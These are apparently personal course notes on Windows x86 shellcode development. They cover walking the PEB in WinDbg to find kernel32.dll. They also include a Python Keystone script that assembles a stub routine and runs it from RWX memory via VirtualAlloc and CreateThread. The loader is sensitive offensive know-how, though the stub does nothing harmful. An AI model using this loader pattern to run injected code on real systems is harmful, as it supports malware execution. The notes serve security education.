# PEB Method

`dt nt!_TEB @$teb`
`dt nt!_PEB 0x16H`
`dt _PEB_LDR_DATA 0x16H`
`dt _LIST_ENTRY 0x0`
`dt _LDR_DATA_TABLE_ENTRY (0x0 - 0x10||0x20)` : this struct isn't found from walking through the PEB/TEB struct, needs to be known beforehand (given by course material). If walking the InInitializationOrderLinks, then it resides 0x10 before the _LIST_ENTRY address (on x32 systems, and 0x20 before on x64 systems)
- Walk through the list entries, reading the DLL name until we find what we need (kernel32.dll), from there we grab the DllBase for its memory address

# Assembling the Shellcode
Use Keystone Engine and CTypes library in Python to build a script that will:
- Turn assembly into opcodes
- Allocate memory for the shellcode
- Copy the shellcode to allocated memory
- Execute the shellcode

[[LINK TO SETTING UP KEYSTONE]]

```
import ctypes, struct
from keystone import *

CODE = (
	"start:					"	#
	"	int3				;"	# breakpoint for debugging, remove before deployment!
	"	mov ebp, esp		;"	# move ebp up to esp addr, simulating a func call and perserving params
	"	sub esp, 60h		;"	# move esp up another 0x60 to avoid clobbering the stack
	
	"find_kernel32:	"			#
	"	xor ecx, ecx		;"	# 
	"	mov esi,fs:[ecx+30h];"	#
)

### generate shellcode ###
ks = KS(KS_ARCH_x86, KS_MODE_32) # init keystone engine for x32
encoding, count = ks.asm(CODE) # where .asm compiles the instruction in CODE
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e) # for each item, add the given byte object from an unsigned char (B)
shellcode = bytearray(sh)

### test the the generated shellcode within the script ###
# Allocates a memory page with PAGE_EXECUTE_READWRITE protections and makes a pointer
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
# copy the shellcode to a c_char buffer space
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
# copy the buffer into the memory page
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
# pause execution so the user can attach windbg to python.exe									 
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
# runs the shellcode in a new thread of python.exe
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))									 

```
see https://docs.python.org/3/library/struct.html#format-characters for info on struct.pack




https://bsodtutorials.wordpress.com/2021/06/14/windows-address-translation-deep-dive-part-1/

article about segmentation and wtf the fs/gs segment registers are pointing to.



# Thoughts on note structure?
- Reference
-- Links
-- Succinct Application / Usage
--- Explanation

- Walkthrough
-- Objective
-- Links?
-- Definitions
-- Context -> Execution -> Repeat

- Thoughts